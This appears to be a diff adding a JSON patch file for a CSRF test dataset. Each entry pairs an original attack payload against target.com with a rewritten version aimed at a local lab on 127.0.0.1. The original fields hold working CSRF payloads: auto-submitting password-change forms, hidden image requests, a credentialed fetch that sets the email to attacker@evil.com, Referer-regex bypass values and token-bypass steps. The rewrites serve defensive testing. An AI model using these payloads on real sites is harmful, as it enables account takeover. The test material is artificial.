@@ -1,0 +1,134 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "csrf-basic",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "<form action=\"http://target.com/change-password\" method=\"POST\">\n  <input type=\"hidden\" name=\"new_password\" value=\"hacked123\">\n  <input type=\"hidden\" name=\"confirm_password\" value=\"hacked123\">\n  <input type=\"submit\" value=\"Click me\">\n</form>\n<script>document.forms[0].submit();</script>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/profile-email\" method=\"post\">\n  <input type=\"hidden\" name=\"email\" value=\"csrf-a1@lab.invalid\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_FORM_A1\">\n  <button type=\"submit\">Submit local CSRF marker</button>\n</form>\n<script>document.forms[0].requestSubmit();</script>"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "<img src=\"http://target.com/delete?id=123\" style=\"display:none\">\n或直接诱导用户点击:\nhttp://target.com/delete?id=123",
+          "command": "<img src=\"http://127.0.0.1:18080/lab/csrf/state-change-get?marker=CSRF_GET_B2\" alt=\"CSRF_GET_B2\">"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "<script>\nfetch(\"http://target.com/api/change-email\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"text/plain\"},\n  body: JSON.stringify({email: \"attacker@evil.com\"})\n});\n</script>",
+          "command": "<script>\nfetch(\"http://127.0.0.1:18080/lab/csrf/json-compatible\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"text/plain\"},\n  body: JSON.stringify({marker: \"CSRF_TEXT_C3\"})\n}).then(response => document.body.dataset.status = String(response.status));\n</script>"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "<a href=\"http://target.com/action?param=value\">点击领取红包</a>\n或短链接隐藏真实URL",
+          "command": "<a href=\"http://127.0.0.1:18080/lab/csrf/navigation?marker=CSRF_NAV_D4\">CSRF_NAV_D4</a>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "使用Referrer Policy:\n<meta name=\"referrer\" content=\"no-referrer\">\n或使用data URL:\n<data:text/html;base64,CSRF_PAYLOAD>\n或使用HTTPS->HTTP降级",
+          "command": "<!doctype html>\n<meta name=\"referrer\" content=\"no-referrer\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/referer-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_NOREF_E5\">\n  <button type=\"submit\">Submit no-referrer control</button>\n</form>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "1. 检查Token是否可预测\n2. 检查Token是否绑定会话\n3. 检查Token是否在GET参数中泄露\n4. 检查是否有Token重放漏洞",
+          "command": "<!doctype html>\n<form action=\"http://127.0.0.1:18080/lab/csrf/token-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_TOKEN_F6\">\n  <button type=\"submit\">Submit missing-token control</button>\n</form>"
+        }
+      ]
+    },
+    {
+      "id": "csrf-referer-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 正则只检查包含\nReferer: http://attacker.com/target.com/\nReferer: http://target.com.attacker.com/\nReferer: http://attacktarget.com/\n\n# 正则只检查开头\nReferer: http://target.com.attacker.com/\n\n# 正则只检查结尾\nReferer: http://attacker.com/target.com",
+          "command": "for value in \"http://attacker.invalid/allowed.invalid/\" \"http://allowed.invalid.attacker.invalid/\" \"http://attackallowed.invalid/\"; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/referer-policy\" -H \"Referer: $value\" --data \"marker=REFERER_REGEX_A1\" | jq -c '{referer,allowed,reason}'; done"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 不发送Referer\n<meta name=\"referrer\" content=\"no-referrer\">\n\n# data URL\ndata:text/html,<script>CSRF</script>\n\n# about:blank\nabout:blank\n\n# HTTPS->HTTP降级\n从HTTPS站点跳转到HTTP",
+          "command": "<!doctype html>\n<meta name=\"referrer\" content=\"no-referrer\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/referer-policy\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"REFERER_EMPTY_B2\">\n  <button type=\"submit\">Submit empty Referer control</button>\n</form>"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 从子域名发起\nReferer: http://sub.target.com/attack\n\n# 从兄弟域名发起\nReferer: http://sibling.target.com/\n\n# 利用子域名XSS\n在子域名注入XSS发起CSRF",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/referer-policy\" -H \"Referer: http://sub.127.0.0.1.nip.io:18080/lab-origin\" --data \"marker=REFERER_SUBDOMAIN_C3\" | jq -c '{referer,allowed,reason}'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# origin-only\n<meta name=\"referrer\" content=\"origin\">\nReferer: http://target.com\n\n# origin-when-cross-origin\n<meta name=\"referrer\" content=\"origin-when-cross-origin\">",
+          "command": "<!doctype html>\n<meta name=\"referrer\" content=\"origin\">\n<a href=\"http://127.0.0.1:18080/lab/csrf/referer-policy?marker=REFERER_ORIGIN_D4\">REFERER_ORIGIN_D4</a>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用iframe嵌入目标\n<iframe src=\"http://target.com\" referrerpolicy=\"no-referrer\">\n\n# sandbox属性\n<iframe sandbox=\"allow-scripts\" src=\"...\">",
+          "command": "<iframe referrerpolicy=\"no-referrer\" sandbox=\"allow-forms\" src=\"http://127.0.0.1:18080/lab/csrf/referer-frame?marker=REFERER_FRAME_E5\"></iframe>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# Flash可以控制Referer\n# 编译SWF发送自定义Referer",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/referer-policy\" --data \"marker=REFERER_MISSING_F6\" | jq -c '{referer,allowed,reason}'"
+        }
+      ]
+    },
+    {
+      "id": "csrf-token-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 分析Token生成规律\n# 常见弱Token模式:\n- 时间戳\n- 递增数字\n- 用户ID哈希\n- 弱随机数\n\n# 预测并构造有效Token",
+          "command": "node -e \"const fs=require('fs');const values=fs.readFileSync('fixtures/csrf-tokens.txt','utf8').trim().split(/\\r?\\n/);const unique=new Set(values);const lengths=[...new Set(values.map(v=>v.length))];console.log(JSON.stringify({samples:values.length,unique:unique.size,lengths},null,2))\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Token不验证会话\n# 攻击步骤:\n1. 攻击者获取自己的Token\n2. 使用该Token构造CSRF\n3. 诱使受害者提交\n\n# Token可跨用户使用",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/token-binding\" -H \"X-Lab-Session: CSRF_VICTIM_B2\" -H \"X-CSRF-Token: CSRF_ATTACKER_TOKEN_B2\" --data \"marker=CSRF_BINDING_B2\" | jq -e '.accepted == false and .reason == \"token_session_mismatch\"'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Token在URL中泄露\nhttp://target.com/page?token=xxx\n\n# Token在Referer中泄露\n从包含Token的页面跳转\n\n# Token在日志中泄露\n服务器日志记录Token",
+          "command": "rg -n --glob '*.{js,ts,tsx,html,log,conf}' '(?:csrf|xsrf)[_-]?token[^\\n]{0,80}(?:url|query|referer|logger|console)' src server fixtures"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# Token可重复使用\n# 攻击步骤:\n1. 获取有效Token\n2. 多次使用同一Token\n3. Token不过期或不失效",
+          "command": "for attempt in 1 2; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/token-replay\" -H \"X-Lab-Session: CSRF_SESSION_D4\" -H \"X-CSRF-Token: CSRF_ONE_TIME_D4\" --data \"marker=CSRF_REPLAY_D4\" | jq -c '{attempt,accepted,reason}' --argjson attempt \"$attempt\"; done"
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 尝试删除Token参数\nPOST /action HTTP/1.1\n# 不发送Token参数\n\n# 尝试空Token\nPOST /action?token=\n\n# 尝试删除Token头",
+          "command": "for mode in missing empty; do if [ \"$mode\" = missing ]; then header=(); else header=(-H \"X-CSRF-Token:\"); fi; curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/token-required\" -H \"X-Lab-Session: CSRF_SESSION_E5\" \"${header[@]}\" --data \"marker=CSRF_REQUIRED_E5\" | jq -c '{accepted,reason}'; done"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用_method参数\nPOST /action?_method=PUT&token=xxx\n\n# 使用X-HTTP-Method-Override\nX-HTTP-Method-Override: PUT",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/method-override\" -H \"X-HTTP-Method-Override: PUT\" -H \"X-Lab-Session: CSRF_SESSION_F6\" --data \"marker=CSRF_METHOD_F6\" | jq -e '.csrf_checked == true'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 使用JSON格式提交\nContent-Type: application/json\n{\"token\": \"xxx\", \"action\": \"delete\"}\n\n# 可能绕过Token验证",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/parser-consistency\" -H \"Content-Type: application/json\" -H \"X-Lab-Session: CSRF_SESSION_G7\" --data '{\"marker\":\"CSRF_JSON_G7\"}' | jq -e '.csrf_checked == true and .accepted == false'"
+        }
+      ]
+    }
+  ]
+}
